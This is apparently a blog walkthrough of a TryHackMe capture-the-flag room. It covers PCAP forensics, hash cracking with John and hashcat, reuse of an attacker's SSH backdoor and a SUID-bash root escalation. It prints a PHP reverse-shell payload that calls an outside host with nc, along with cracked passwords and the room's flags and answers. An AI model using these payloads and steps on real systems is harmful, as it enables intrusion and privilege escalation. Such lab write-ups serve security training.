---
layout: post
title: THM — Overpass 2 — Hacked
date: 2022-10-01 00:00:00 -500
categories: [TryHackMe]
tags: [Wireshark]
---

<img src="/assets/images/THM/Overpass%202%20—%20Hacked/logo.png" alt="THM — Overpass 2 — Hacked — Logo" width="30%">

***

<center><strong><font color="White">Overpass has been hacked! Can you analyse the attacker's actions and hack back in?</font></strong></center>

***

## <strong><font color="#34A5DA">Forensics — Analyse the PCAP</font></strong>

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

***

We can open this .pcapng file in Wireshark.

First, we can the upload of a reverse shell:

<img src="/assets/images/THM/Overpass%202%20—%20Hacked/1.png" alt="THM — Overpass 2 — Hacked — Logo" width="80%">


> What was the URL of the page they used to upload a reverse shell? `/development/`

If we follow that HTTP stream, we can find the payload attacker used. (`tcp.stream eq 1`)

<img src="/assets/images/THM/Overpass%202%20—%20Hacked/2.png" width="80%">

> What payload did the attacker use to gain access? `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

We can see that ataacker was listening in port 4242. We can search for it via: `tcp.port == 4242 `. Then <em>Follow TCP Stream</em>. 

<img src="/assets/images/THM/Overpass%202%20—%20Hacked/3.png" width="80%">

> What password did the attacker use to privesc? `whenevernoteartinstant`

> How did the attacker establish persistence? `https://github.com/NinjaJc01/ssh-backdoor`

Next we are asked how many system password were crackable with fasttrack wordlist? To answer this question we can try to do the same:

```bash
wget https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt
```

```console
vladislav@Mac ~ % john shadow --wordlist=share/wordlists/fasttrack.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
secuirty3        (paradox)
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
4g 0:00:00:01 DONE (2022-10-01 09:48) 3.846g/s 213.4p/s 976.9c/s 976.9C/s admin..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> Using the fasttrack wordlist, how many of the system passwords were crackable? `4`

***

## <strong><font color="#34A5DA">Research — Analyse the code</font></strong>

Now that you've found the code for the backdoor, it's time to analyse it.

***

Visiting the link we can see `main.go` which we can analyse.

We can found the default hash in the line 19:
```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

> What's the default hash for the backdoor? `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

Going further we can find the default salt:
```go
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

> What's the hardcoded salt for the backdoor? `1c362db832f3f864c8c2fe05f2002a05`

Going back to Wireshark we can answer the next question.

> What was the hash that the attacker used? `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

Now let's crack it.

<a href="https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/">Guide on how to use hashcat</a> and <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat examples of hashes</a>. Moreover, <a href="https://www.onlinehashcrack.com/hash-identification.php">online hash identifier</a>.

```console
vladislav@Mac ~ % hashcat -m 1710 -a 0 -o cracked.txt hash.txt share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

* Device #2: Apple's OpenCL drivers (GPU) are known to be unreliable.
             You have been warned.

METAL API (Metal 263.8)
=======================
* Device #1: Apple M1 Pro, 5408/10922 MB, 16MCU

OpenCL API (OpenCL 1.2 (Aug  8 2022 21:29:55)) - Platform #1 [Apple]
====================================================================
* Device #2: Apple M1 Pro, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory required for this attack: 281 MB

Dictionary cache built:
* Filename..: share/wordlists/rockyou.txt
* Passwords.: 14344394
* Bytes.....: 139921525
* Keyspace..: 14344387
* Runtime...: 1 sec

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1710 (sha512($pass.$salt))
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Sat Oct  1 11:57:28 2022 (0 secs)
Time.Estimated...: Sat Oct  1 11:57:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 31951.2 kH/s (10.91ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 524288/14344387 (3.66%)
Rejected.........: 0/524288 (0.00%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> chaddy12
Hardware.Mon.SMC.: Fan0: 0%, Fan1: 0%
Hardware.Mon.#1..: Util: 62%

Started: Sat Oct  1 11:57:06 2022
Stopped: Sat Oct  1 11:57:29 2022
```

cracked.txt:
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```

> Crack the hash using rockyou and a cracking tool of your choice. What's the password? `november16`

***

## <strong><font color="#34A5DA">Attack — Get back in!</font></strong>

Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!

***

<img src="/assets/images/THM/Overpass%202%20—%20Hacked/4.png" width="90%">

> The attacker defaced the website. What message did they leave as a heading? `H4ck3d by CooctusClan`

Making nmap we can prove that backdoor is still working:
```console
vladislav@Mac ~ % nmap -sV -sC 10.10.2.172
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-01 12:03 MSK
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.23 seconds
vladislav@Mac ~ % nmap -sV -sC 10.10.2.172
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-01 12:06 MSK
Nmap scan report for 10.10.2.172
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e43abeedffa702d26ad6d0bb7f385ecb (RSA)
|   256 fc6f22c2134f9c624f90c93a7e77d6d4 (ECDSA)
|_  256 15fd400a6559a9b50e571b230a966305 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: LOL Hacked
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2a6d21879e3b020a24faab6ac2e6bf2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can repeat the steps that the hackers used. Let's ssh:
```
vladislav@Mac ~ % ssh 10.10.2.172 -p 2222
The authenticity of host '[10.10.2.172]:2222 ([10.10.2.172]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.2.172]:2222' (RSA) to the list of known hosts.
vladislav@10.10.2.172's password: 
vladislav@10.10.2.172's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ whoami
james
```

> What's the user flag? `thm{d119b4fa8c497ddb0525f7ad200e6567}`

The password for root doesn't work. Searching for something useful we can find .suid_bash:
```console
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

This is a bash with SUID bit set. Looking on gtfobins we can find next steps:
```console
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
```

> What's the root flag? `thm{d53b2684f169360bb9606c333873144d}`